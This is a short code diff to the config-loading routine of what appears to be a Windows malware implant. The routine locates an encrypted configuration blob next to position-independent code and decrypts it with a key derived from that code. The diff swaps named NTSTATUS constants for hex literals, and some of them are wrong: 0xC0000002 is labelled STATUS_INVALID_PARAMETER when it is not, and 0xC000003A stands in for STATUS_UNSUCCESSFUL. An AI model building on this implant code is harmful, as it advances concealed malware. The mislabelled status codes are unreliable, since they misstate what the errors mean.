@@ -116,7 +116,7 @@ NTSTATUS cfg_init(IMPLANT_CONTEXT *ctx) {
 
     PVOID pic_base = cfg_get_pic_base();
     if (!pic_base)
-        return STATUS_INVALID_PARAMETER;
+        return (NTSTATUS)0xC0000002; /* STATUS_INVALID_PARAMETER — no pic base */
 
     spec_memset(&g_config, 0, sizeof(IMPLANT_CONFIG));
     g_cfg_is_encrypted = FALSE;
@@ -124,7 +124,7 @@ NTSTATUS cfg_init(IMPLANT_CONTEXT *ctx) {
     /* Locate config blob */
     CONFIG_BLOB_HEADER *hdr = cfg_find_blob(pic_base);
     if (!hdr)
-        return STATUS_OBJECT_NAME_NOT_FOUND;
+        return (NTSTATUS)0xC0000034; /* STATUS_OBJECT_NAME_NOT_FOUND — blob not found */
 
     /* Derive decryption key from PIC code */
     BYTE key[AEAD_KEY_SIZE];
@@ -146,7 +146,7 @@ NTSTATUS cfg_init(IMPLANT_CONTEXT *ctx) {
     spec_memset(key, 0, sizeof(key));
 
     if (!ok)
-        return STATUS_UNSUCCESSFUL;
+        return (NTSTATUS)0xC000003A; /* decrypt failed */
 
     /* Copy decrypted config (handle undersized blobs gracefully) */
     DWORD copy_len = hdr->data_size < sizeof(IMPLANT_CONFIG)
